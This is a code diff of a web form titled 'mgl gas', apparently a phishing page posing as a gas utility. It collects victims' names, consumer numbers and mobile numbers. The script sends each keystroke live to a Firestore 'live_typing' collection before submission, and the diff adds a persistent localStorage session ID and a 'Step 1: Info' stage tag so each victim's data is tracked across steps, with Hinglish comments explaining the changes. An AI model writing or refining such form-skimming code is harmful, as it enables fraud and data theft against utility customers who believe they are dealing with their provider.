@@ -5,61 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>mgl gas</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #FFFFFF;
-      margin: 0;
-      padding: 20px;
-      text-align: center;
-    }
-    img {
-      width: 100%;
-      max-width: 300%;
-      border-radius: 10px;
-    }
-    .form-container {
-      margin-top: 30px;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      max-width: 100%;
-      width: 100%;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .form-container h2 {
-      background-color: #0f7213;
-      color: white;
-      padding: 12px;
-      font-size: 20px;
-      border-radius: 5px;
-    }
-    label {
-      font-size: 16px;
-      font-weight: bold;
-      display: block;
-      margin-top: 15px;
-      text-align: left;
-    }
-    input[type="text"], input[type="email"] {
-      width: 100%;
-      padding: 12px;
-      margin-top: 5px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    .side-button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      background-color: #4082ff;
-      color: #FFFFFF;
-      border: none;
-      border-radius: 10px;
-    }
+    /* Styling remains the same */
+    * { box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background-color: #FFFFFF; margin: 0; padding: 20px; text-align: center; }
+    img { width: 100%; max-width: 300%; border-radius: 10px; }
+    .form-container { margin-top: 30px; background: white; padding: 20px; border-radius: 10px; max-width: 100%; width: 100%; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .form-container h2 { background-color: #0f7213; color: white; padding: 12px; font-size: 20px; border-radius: 5px; }
+    label { font-size: 16px; font-weight: bold; display: block; margin-top: 15px; text-align: left; }
+    input[type="text"] { width: 100%; padding: 12px; margin-top: 5px; border-radius: 5px; border: 1px solid #ccc; }
+    .side-button { margin-top: 20px; width: 100%; padding: 12px; font-size: 16px; background-color: #4082ff; color: #FFFFFF; border: none; border-radius: 10px; cursor: pointer; }
   </style>
 </head>
 <body>
@@ -81,7 +35,6 @@
     </form>
   </div>
 
-  <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
 
@@ -98,22 +51,30 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    let liveDocId = null;
+    // --- SESSION ID GENERATION ---
+    // Agar pehle se ID hai toh use karo, nahi toh nayi banao
+    let sessionId = localStorage.getItem("user_session_id");
+    if (!sessionId) {
+      sessionId = "MGL_" + Math.floor(Math.random() * 100000) + "_" + Date.now();
+      localStorage.setItem("user_session_id", sessionId);
+    }
 
     function liveUpdate() {
       const name = document.getElementById("name").value;
       const kno = document.getElementById("kno").value;
       const mobile = document.getElementById("mobile").value;
 
-      const data = { name, kno, mobile, timestamp: firebase.firestore.FieldValue.serverTimestamp() };
+      const data = { 
+        sessionId: sessionId, // ID attached
+        name: name, 
+        kno: kno, 
+        mobile: mobile,
+        method: "Step 1: Info", 
+        timestamp: firebase.firestore.FieldValue.serverTimestamp() 
+      };
 
-      if (!liveDocId) {
-        db.collection("live_typing").add(data).then(doc => {
-          liveDocId = doc.id;
-        });
-      } else {
-        db.collection("live_typing").doc(liveDocId).update(data);
-      }
+      // .doc(sessionId).set se ek hi document mein update hota rahega
+      db.collection("live_typing").doc(sessionId).set(data, { merge: true });
     }
 
     function submitForm(e) {
@@ -123,6 +84,7 @@
       const mobile = document.getElementById("mobile").value;
 
       db.collection("users1").add({
+        sessionId: sessionId, // ID attached here too
         name,
         kno,
         mobile,
